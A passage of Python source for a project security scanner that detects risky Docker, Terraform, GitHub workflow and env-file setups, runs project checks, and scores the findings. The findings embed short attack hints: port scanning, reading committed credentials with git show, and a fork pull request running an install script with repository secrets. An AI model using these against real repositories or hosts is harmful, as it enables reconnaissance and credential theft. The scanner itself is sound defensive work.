_GHA_PR_TARGET = re.compile(r"^\s*(-\s*)?pull_request_target\b|on:\s*\[?[^\n]*pull_request_target")
_GHA_HEAD_CHECKOUT = re.compile(r"ref:\s*\$\{\{\s*github\.event\.pull_request\.head\.(sha|ref)")
_K8S_MARKERS = (re.compile(r"^\s*apiVersion:", re.M), re.compile(r"^\s*kind:", re.M))
_COMPOSE_MARKER = re.compile(r"^\s*services:\s*$", re.M)


# File classification -----------------------------------------------------------


def _classify(rel: str, name: str, ext: str, text: str) -> str:
    lower = name.lower()
    rel_l = rel.lower()
    if lower == "dockerfile" or lower.startswith("dockerfile.") or lower.endswith(".dockerfile"):
        return "dockerfile"
    if lower.startswith(".env") and not lower.endswith((".example", ".sample", ".template", ".dist", ".md")):
        return "env"
    if ext in {".tf", ".tfvars"}:
        return "terraform"
    if ext in {".yml", ".yaml"}:
        if "/.github/workflows/" in f"/{rel_l}":
            return "workflow"
        if lower.startswith(("docker-compose", "compose")) and _COMPOSE_MARKER.search(text):
            return "compose"
        if all(m.search(text) for m in _K8S_MARKERS):
            return "k8s"
        return "config"
    if ext in _CODE_EXTS:
        return "code"
    if ext in _CONFIG_EXTS:
        return "config"
    return "other"


def _walk(root: Path, subpath: str | None) -> list[tuple[str, Path]]:
    base = root
    if subpath:
        candidate = (root / subpath).resolve()
        try:
            candidate.relative_to(root.resolve())
        except ValueError:
            return []
        if candidate.is_file():
            return [(subpath.replace("\\", "/"), candidate)]
        if candidate.is_dir():
            base = candidate
    out: list[tuple[str, Path]] = []
    for dirpath, dirnames, filenames in os.walk(base):
        dirnames[:] = sorted(
            d for d in dirnames if d not in _SKIP_DIRS and (not d.startswith(".") or d == ".github")
        )
        for name in sorted(filenames):
            if ".min." in name.lower():
                continue
            full = Path(dirpath) / name
            try:
                if full.stat().st_size > _MAX_FILE_BYTES:
                    continue
            except OSError:
                continue
            try:
                rel = str(full.relative_to(root)).replace("\\", "/")
            except ValueError:
                continue
            if _is_test_path(rel):
                continue
            out.append((rel, full))
            if len(out) >= _MAX_FILES:
                return out
    return out


def _finding(rule: Rule, rel: str, line_no: int, line: str) -> dict[str, Any]:
    excerpt = line.strip()[:160]
    return {
        "id": rule.id,
        "severity": rule.severity,
        "category": rule.category,
        "summary": rule.summary,
        "explanation": f"{rule.summary}: `{excerpt}`",
        "recommendation": rule.recommendation,
        "file_path": rel,
        "line": line_no,
        "source": "navin-deep",
        "malicious_input_example": rule.payload,
        "poc_sketch": rule.sketch,
        "cwe": rule.cwe,
    }


def _scan_lines(rules: tuple[Rule, ...], kind: str, ext: str, rel: str, text: str) -> list[dict[str, Any]]:
    out: list[dict[str, Any]] = []
    applicable = [
        r for r in rules if kind in r.kinds and (r.exts is None or ext in r.exts or kind != "code")
    ]
    if not applicable:
        return out
    for idx, line in enumerate(text.splitlines(), start=1):
        if not line.strip() or len(line) > _MAX_LINE_CHARS:
            continue
        is_comment = bool(_COMMENT_LINE.match(line))
        for rule in applicable:
            if is_comment and rule.skip_comments:
                continue
            if not rule.pattern.search(line):
                continue
            if rule.exclude is not None and rule.exclude.search(line):
                continue
            out.append(_finding(rule, rel, idx, line))
    return out


def _scan_terraform_ingress(rel: str, text: str) -> list[dict[str, Any]]:
    out: list[dict[str, Any]] = []
    ctx: str | None = None
    depth = 0
    rule_type: str | None = None
    for idx, line in enumerate(text.splitlines(), start=1):
        if _TF_RESOURCE.match(line):
            rule_type = None
        type_match = _TF_RULE_TYPE.match(line)
        if type_match:
            rule_type = type_match.group(1)
        block = _TF_BLOCK_OPEN.match(line)
        if block and ctx is None:
            ctx = block.group(1)
            depth = line.count("{") - line.count("}")
        elif ctx is not None:
            depth += line.count("{") - line.count("}")
            if depth <= 0:
                ctx = None
        inbound = ctx == "ingress" or (ctx is None and rule_type == "ingress")
        if inbound and _TF_CIDR_OPEN.search(line):
            out.append(
                {
                    "id": "tf-open-ingress",
                    "severity": "high",
                    "category": "Cloud",
                    "summary": "Inbound security group rule open to the whole internet",
                    "explanation": f"Ingress from 0.0.0.0/0 or ::/0: `{line.strip()[:160]}`",
                    "recommendation": "Restrict the source CIDR to known ranges; expose public ports only through a load balancer.",
                    "file_path": rel,
                    "line": idx,
                    "source": "navin-deep",
                    "malicious_input_example": "nmap -p- <public-ip>",
                    "poc_sketch": "Every port in the rule answers from any IP on the internet; scope the CIDR.",
                    "cwe": "CWE-284",
                }
            )
    return out


def _scan_dockerfile_user(rel: str, text: str) -> list[dict[str, Any]]:
    last_from_line = 0
    last_from_image = ""
    has_user = False
    for idx, line in enumerate(text.splitlines(), start=1):
        m = _DOCKER_FROM.match(line)
        if m:
            last_from_line = idx
            last_from_image = m.group(1).lower()
        if _DOCKER_USER.match(line):
            has_user = True
    if not last_from_line or has_user or last_from_image == "scratch":
        return []
    return [
        {
            "id": "docker-root-user",
            "severity": "medium",
            "category": "Container",
            "summary": "Container runs as root (no USER instruction)",
            "explanation": f"No USER instruction after `FROM {last_from_image}`; the process starts as uid 0.",
            "recommendation": "Create an unprivileged user in the image and switch to it with USER before CMD/ENTRYPOINT.",
            "file_path": rel,
            "line": last_from_line,
            "source": "navin-deep",
            "malicious_input_example": "id -> uid=0(root)",
            "poc_sketch": "Code execution in the container is root; with a volume or socket mount it reaches the host.",
            "cwe": "CWE-250",
        }
    ]


def _scan_workflow_pr_target(rel: str, text: str) -> list[dict[str, Any]]:
    if not _GHA_PR_TARGET.search(text):
        return []
    for idx, line in enumerate(text.splitlines(), start=1):
        if _GHA_HEAD_CHECKOUT.search(line):
            return [
                {
                    "id": "gha-pr-target-checkout",
                    "severity": "high",
                    "category": "CI/CD",
                    "summary": "pull_request_target workflow checks out the fork's code",
                    "explanation": f"Untrusted PR head checked out under a write token: `{line.strip()[:160]}`",
                    "recommendation": "Use pull_request for fork code, or never execute the checked-out code under pull_request_target.",
                    "file_path": rel,
                    "line": idx,
                    "source": "navin-deep",
                    "malicious_input_example": "PR that edits package.json postinstall",
                    "poc_sketch": "The fork's install script runs with repository secrets and a write token; split the workflow.",
                    "cwe": "CWE-829",
                }
            ]
    return []


# Project checks ------------------------------------------------------------------


def _git_tracked(root: Path, patterns: list[str]) -> list[str]:
    git = shutil.which("git")
    if not git or not (root / ".git").exists():
        return []
    try:
        completed = subprocess.run(  # noqa: S603
            [git, "ls-files", "-z", "--", *patterns],
            cwd=str(root),
            capture_output=True,
            timeout=20,
            **no_window_kwargs(),
        )
    except (OSError, subprocess.SubprocessError):
        return []
    raw = completed.stdout.decode("utf-8", errors="replace")
    return [p for p in raw.split("\0") if p]


def _read_small(path: Path, limit: int = 200_000) -> str:
    try:
        if path.stat().st_size > limit:
            return ""
        return path.read_text(encoding="utf-8", errors="replace")
    except OSError:
        return ""


def _project_checks(root: Path, files: list[tuple[str, Path]]) -> tuple[list[dict[str, Any]], list[dict[str, Any]]]:
    checks: list[dict[str, Any]] = []
    findings: list[dict[str, Any]] = []
    names = {rel for rel, _ in files}
    top = {rel for rel in names if "/" not in rel}

    def add(check_id: str, status: str, title: str, detail: str) -> None:
        checks.append({"id": check_id, "status": status, "title": title, "detail": detail})

    # Env files tracked by git.
    tracked_env = [
        p
        for p in _git_tracked(root, [".env", ".env.*", "*/.env", "*/.env.*"])
        if not p.lower().endswith((".example", ".sample", ".template", ".dist"))
    ]
    if tracked_env:
        add(
            "env-tracked",
            "fail",
            "Environment file tracked by git",
            ", ".join(tracked_env[:5]) + (" ..." if len(tracked_env) > 5 else ""),
        )
        for rel in tracked_env[:10]:
            findings.append(
                {
                    "id": "env-tracked",
                    "severity": "critical",
                    "category": "Secrets",
                    "summary": "Environment file committed to git",
                    "explanation": f"`{rel}` is tracked by git; every value in it is in the repository history.",
                    "recommendation": "git rm --cached the file, add it to .gitignore, rotate every credential it holds, purge history if the repository is shared.",
                    "file_path": rel,
                    "line": 1,
                    "source": "navin-deep",
                    "malicious_input_example": f"git show HEAD:{rel}",
                    "poc_sketch": "Anyone who clones the repository reads the credentials; rotate and untrack.",
                    "cwe": "CWE-540",
                }
            )
    else:
        add("env-tracked", "pass", "No environment file tracked by git", "")

    # .gitignore covers .env when env files exist.
    env_present = any(rel.split("/")[-1].startswith(".env") for rel in names)
    gitignore = _read_small(root / ".gitignore") if (root / ".gitignore").is_file() else ""
    if env_present:
        if re.search(r"(?m)^\s*\.env(\*|\.\*|\b)", gitignore):
            add("gitignore-env", "pass", ".gitignore covers .env files", "")
        else:
            add("gitignore-env", "warn", ".gitignore does not cover .env files", "Add `.env` and `.env.*` to .gitignore.")

    # Lockfiles.
    if "package.json" in top:
        locks = {"package-lock.json", "yarn.lock", "pnpm-lock.yaml", "bun.lockb", "bun.lock"}
        if locks & top:
            add("lockfile-node", "pass", "Node lockfile present", "")
        else:
            add("lockfile-node", "warn", "package.json without a lockfile", "Builds resolve different dependency versions over time.")
            findings.append(
                {
                    "id": "no-lockfile",
                    "severity": "low",
                    "category": "Supply chain",
                    "summary": "package.json without a lockfile",
                    "explanation": "No package-lock.json, yarn.lock, pnpm-lock.yaml or bun.lock next to package.json.",
                    "recommendation": "Commit the lockfile and install with npm ci / pnpm install --frozen-lockfile.",
                    "file_path": "package.json",
                    "line": 1,
                    "source": "navin-deep",
                    "malicious_input_example": "dependency publishes a malicious patch release",
                    "poc_sketch": "The next install pulls the new release unreviewed; a lockfile pins the tree.",
                    "cwe": "CWE-1104",
                }
            )
    if "pyproject.toml" in top or "requirements.txt" in top:
        py_locks = {"uv.lock", "poetry.lock", "Pipfile.lock", "requirements.txt", "requirements.lock", "pdm.lock"}
        if py_locks & top:
            add("lockfile-python", "pass", "Python dependency pins present", "")
        else:
            add("lockfile-python", "warn", "No Python lockfile", "Add uv.lock / poetry.lock or a pinned requirements file.")

    # Express without helmet.
    if "package.json" in top:
        pkg = _read_small(root / "package.json")
        if re.search(r"\"express\"\s*:", pkg) and not re.search(r"\"helmet\"\s*:", pkg):
            add("express-helmet", "warn", "Express without helmet", "Security headers (CSP, HSTS, nosniff) are not set by default.")
            findings.append(
                {
                    "id": "express-no-helmet",
                    "severity": "medium",
                    "category": "Misconfiguration",
                    "summary": "Express application without helmet security headers",
                    "explanation": "package.json depends on express but not on helmet; responses ship without CSP, HSTS, X-Content-Type-Options.",
                    "recommendation": "npm install helmet and app.use(helmet()) before the routes.",
                    "file_path": "package.json",
                    "line": 1,
                    "source": "navin-deep",
                    "malicious_input_example": "curl -I https://app/ shows no Content-Security-Policy",
                    "poc_sketch": "Without CSP and nosniff an injected script runs unrestricted; helmet sets the headers in one line.",
                    "cwe": "CWE-693",
                }
            )
        elif re.search(r"\"express\"\s*:", pkg):
            add("express-helmet", "pass", "Express with helmet", "")

    # Security policy.
    if any(rel.lower() in {"security.md", ".github/security.md", "docs/security.md"} for rel in names):
        add("security-policy", "pass", "Security policy (SECURITY.md) present", "")
    else:
        add("security-policy", "info", "No SECURITY.md", "Document how to report a vulnerability.")

    # Dependency update bot.
    if any(rel.lower() in {".github/dependabot.yml", ".github/dependabot.yaml", "renovate.json", ".renovaterc", ".renovaterc.json", ".github/renovate.json"} for rel in names):
        add("dependency-bot", "pass", "Dependency update bot configured", "")
    else:
        add("dependency-bot", "info", "No Dependabot / Renovate configuration", "Automated dependency updates close known CVEs faster.")

    # Security job in CI.
    workflows = [p for rel, p in files if "/.github/workflows/" in f"/{rel}"]
    ci_text = " ".join(_read_small(p, 100_000) for p in workflows[:20]).lower()
    if workflows:
        if re.search(r"codeql|semgrep|trivy|gitleaks|snyk|bandit|pip-audit|npm audit|grype|checkov|tfsec", ci_text):
            add("ci-security", "pass", "Security scanning runs in CI", "")
        else:
            add("ci-security", "info", "No security scanner in CI workflows", "Add CodeQL, Semgrep, Trivy or gitleaks to the pipeline.")

    # Local scanners available for the deep pass.
    present = [t for t in ("gitleaks", "bandit", "semgrep", "pip-audit", "trivy") if shutil.which(t)]
    add(
        "host-scanners",
        "pass" if present else "info",
        "Host scanners available" if present else "No host scanner installed",
        ", ".join(present) if present else "Install gitleaks, bandit or semgrep to deepen the full scan.",
    )
    return checks, findings


# Scoring and aggregation -------------------------------------------------------


def compute_score(counts: dict[str, int]) -> tuple[int, str]:
    deduction = 0
    for sev, weight in _SEVERITY_WEIGHT.items():
        deduction += min(counts.get(sev, 0) * weight, _SEVERITY_CAP[sev])
    score = max(0, 100 - deduction)
    if score >= 90:
        grade = "A"
    elif score >= 75:
        grade = "B"
    elif score >= 60:
        grade = "C"
    elif score >= 40:
        grade = "D"
    else:
        grade = "F"
    return score, grade


def _annotate(finding: dict[str, Any], cwe_by_key: dict[str, str]) -> dict[str, Any]:
    item = dict(finding)
    rule_id = str(item.get("id") or "")
    category = str(item.get("category") or "")
    owasp = _CATEGORY_OWASP.get(category, "A05")
    item["owasp"] = owasp
    item["owasp_name"] = OWASP_2021[owasp]
    cwe = item.get("cwe") or cwe_by_key.get(f"{rule_id}|{item.get('file_path')}|{item.get('line')}") or _RULE_CWE.get(rule_id, "")
    item["cwe"] = cwe
    return item


def _remediation_plan(findings: list[dict[str, Any]]) -> list[dict[str, Any]]:
    groups: dict[tuple[str, str], dict[str, Any]] = {}
    for f in findings:
        key = (str(f.get("id")), str(f.get("severity")))
        g = groups.setdefault(
            key,
            {
                "rule": f.get("id"),
                "title": f.get("summary"),
                "severity": f.get("severity"),
                "category": f.get("category"),
                "owasp": f.get("owasp"),
                "cwe": f.get("cwe"),
                "action": f.get("recommendation"),
                "count": 0,
                "files": [],
            },
        )
        g["count"] += 1
        loc = str(f.get("file_path") or "")
        if loc and loc not in g["files"] and len(g["files"]) < 6:
            g["files"].append(loc)
    plan = sorted(
        groups.values(),
        key=lambda g: (_SEVERITY_RANK.get(str(g["severity"]), 9), -int(g["count"])),
    )
    for order, step in enumerate(plan, start=1):
        step["order"] = order
        sev = str(step["severity"])
        step["effort"] = "S" if sev in {"low", "info"} or step["count"] <= 2 else ("M" if step["count"] <= 8 else "L")
    return plan[:25]


def run_deep_security_scan(
    root: Path,
    *,
    kind: str = "full",
    subpath: str | None = None,
    max_findings: int = 250,
) -> dict[str, Any]:
    """Run every layer and return the aggregated, scored result."""
    started = time.monotonic()
    started_at = datetime.now(timezone.utc)
    root = root.expanduser().resolve(strict=False)
    if not root.is_dir():
        return {"ok": False, "error": f"not a directory: {root}", "findings": []}
    kind_n = (kind or "full").strip().lower()
    if kind_n not in {"full", "quick"}:
        kind_n = "full"

    base = run_security_scan(root, kind=kind_n, subpath=subpath, max_findings=max_findings)
    base_findings = list(base.get("findings") or [])
    tools = list(base.get("tools") or [])

    files = _walk(root, subpath)
    extra: list[dict[str, Any]] = []
    kinds_seen: dict[str, int] = {}
    for rel, full in files:
        text = _read_small(full, _MAX_FILE_BYTES)
        if not text:
            continue
        ext = full.suffix.lower()
        file_kind = _classify(rel, full.name, ext, text)
        kinds_seen[file_kind] = kinds_seen.get(file_kind, 0) + 1
        if file_kind == "code":
            extra.extend(_scan_lines(CODE_RULES, "code", ext, rel, text))
        elif file_kind == "config":
            extra.extend(_scan_lines(CODE_RULES, "code", ext, rel, text))
        elif file_kind == "dockerfile":
            extra.extend(_scan_lines(IAC_RULES, "dockerfile", ext, rel, text))
            extra.extend(_scan_dockerfile_user(rel, text))
        elif file_kind == "compose":
            extra.extend(_scan_lines(IAC_RULES, "compose", ext, rel, text))
        elif file_kind == "k8s":
            extra.extend(_scan_lines(IAC_RULES, "k8s", ext, rel, text))
        elif file_kind == "terraform":
            extra.extend(_scan_lines(IAC_RULES, "terraform", ext, rel, text))
            extra.extend(_scan_terraform_ingress(rel, text))
        elif file_kind == "workflow":
            extra.extend(_scan_lines(IAC_RULES, "workflow", ext, rel, text))
            extra.extend(_scan_workflow_pr_target(rel, text))
        elif file_kind == "env":
            extra.extend(_scan_lines(IAC_RULES, "env", ext, rel, text))

    checks, check_findings = _project_checks(root, files)
    extra.extend(check_findings)
    tools.append({"tool": "navin-deep", "available": True, "count": len(extra)})

    # normalize_finding drops cwe; keep it by location key and re-attach.
    cwe_by_key = {
        f"{f.get('id')}|{f.get('file_path')}|{f.get('line')}": str(f.get("cwe") or "") for f in extra
    }
    merged = enrich_findings_with_poc(dedupe_findings(extra))
    for item in merged:
        item["confidence"] = 0.8
    kept_extra, dropped_extra = apply_fp_filter(merged, min_confidence=0.65)

    combined = kept_extra + base_findings
    combined.sort(
        key=lambda f: (
            _SEVERITY_RANK.get(str(f.get("severity")), 9),
            str(f.get("file_path") or ""),
            f.get("line") or 0,
        )
    )
    combined = combined[: max(1, min(int(max_findings), 500))]
    findings = [_annotate(f, cwe_by_key) for f in combined]

    counts = severity_counts(findings)
    score, grade = compute_score(counts)

    by_category: dict[str, int] = {}
    by_owasp: dict[str, int] = {}
    by_file: dict[str, int] = {}
    for f in findings:
        by_category[str(f.get("category"))] = by_category.get(str(f.get("category")), 0) + 1
        by_owasp[str(f.get("owasp"))] = by_owasp.get(str(f.get("owasp")), 0) + 1
        loc = str(f.get("file_path") or "")
        if loc:
            by_file[loc] = by_file.get(loc, 0) + 1

    duration_ms = int((time.monotonic() - started) * 1000)
    return {
        "ok": True,
        "root": str(root),
        "kind": kind_n,
        "subpath": subpath,
        "started_at": started_at.isoformat(),
        "duration_ms": duration_ms,
        "files_scanned": len(files),
        "file_kinds": kinds_seen,
        "score": score,
        "grade": grade,
        "counts": counts,
        "finding_count": len(findings),
        "dropped_count": int(base.get("dropped_count") or 0) + len(dropped_extra),
        "by_category": [
            {"category": k, "count": v} for k, v in sorted(by_category.items(), key=lambda kv: -kv[1])
        ],
        "by_owasp": [
            {"id": k, "name": OWASP_2021.get(k, k), "count": by_owasp.get(k, 0)} for k in sorted(OWASP_2021)
        ],
        "top_files": [
            {"file_path": k, "count": v} for k, v in sorted(by_file.items(), key=lambda kv: -kv[1])[:10]
        ],
        "tools": tools,
        "project_checks": checks,
        "findings": findings,
        "remediation_plan": _remediation_plan(findings),
        "note": (
            "Heuristic, infrastructure and project checks always run. CLI scanners "
            "(gitleaks, bandit, semgrep, npm audit, pip-audit) contribute in full mode when installed. "
            "Speculative or unproven findings are dropped before this report."
        ),
    }
